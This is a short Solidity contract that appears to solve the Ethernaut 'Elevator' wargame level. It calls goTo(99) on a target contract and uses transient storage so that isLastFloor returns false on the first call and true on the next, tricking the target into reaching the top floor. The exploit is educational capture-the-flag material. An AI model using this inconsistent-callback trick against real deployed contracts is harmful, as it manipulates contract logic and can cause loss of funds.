```solidity
// SPDX-License-Identifier: MIT 

pragma solidity >=0.8.24;

interface Elevator {
    function goTo(uint256 _floor) external ;
}

contract ElevatorSolution {
    Elevator e;

    constructor(address _address) {
        e = Elevator(_address);
    }

    function goToLastFloor() external {
        e.goTo(99);
    }

    function isLastFloor(uint256) external returns (bool) {
        bool result = true;
        // Using transient storage.
        assembly {
            if iszero(tload(0)) {
                result := 0
            }
            tstore(0, 1)
        }
        return result;
    }
}
```
